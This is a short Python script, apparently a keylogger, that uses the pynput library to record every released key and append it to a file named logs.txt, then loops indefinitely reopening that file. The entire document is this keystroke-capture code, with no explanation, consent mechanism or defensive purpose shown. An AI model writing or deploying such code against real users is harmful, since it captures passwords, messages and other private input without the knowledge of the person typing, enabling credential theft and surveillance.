from pynput import keyboard

def on_release(key):
    f.write(str(key))
    

listener=keyboard.Listener(on_release=on_release)
listener.start()


f = open("logs.txt","a")

while True:
    i = 0
    f = open("logs.txt","a")
